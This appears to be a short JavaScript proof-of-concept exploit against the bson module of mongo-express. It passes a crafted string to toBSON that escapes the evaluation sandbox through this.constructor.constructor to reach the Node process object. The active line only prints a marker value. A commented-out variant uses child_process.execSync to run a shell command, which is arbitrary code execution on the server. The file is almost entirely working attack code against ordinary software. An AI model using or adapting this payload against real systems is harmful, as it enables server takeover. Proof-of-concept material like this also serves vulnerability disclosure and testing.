// exploit = "this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch hacked')"
exploit = "this.constructor.constructor(\"return process\")().console.log(2333)"
var bson = require('mongo-express/lib/bson')
bson.toBSON(exploit)
